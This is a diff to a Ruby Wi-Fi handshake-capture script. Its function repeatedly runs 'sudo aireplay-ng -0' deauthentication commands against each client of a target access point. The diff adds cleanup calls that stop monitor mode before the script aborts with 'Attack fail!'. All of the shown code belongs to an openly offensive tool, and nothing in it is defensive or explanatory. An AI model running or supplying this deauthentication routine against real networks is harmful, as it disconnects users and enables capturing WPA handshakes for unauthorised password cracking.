@@ -1,3 +1,5 @@
+require_relative 'monitoring_stopper'
+require_relative 'cleaner'
 #Hanshake capture
 
 def aireplay_runner stations = Array.new
@@ -16,7 +18,9 @@ def aireplay_runner stations = Array.new
 	fork do 
 		sleep(2)
 		5.times do
-			if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0 > replay_output.txt")
+			if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0")
+				monitoring_stopper()
+				cleaner()
 				abort("\nAttack fail!")
 			end
 			sleep(4)
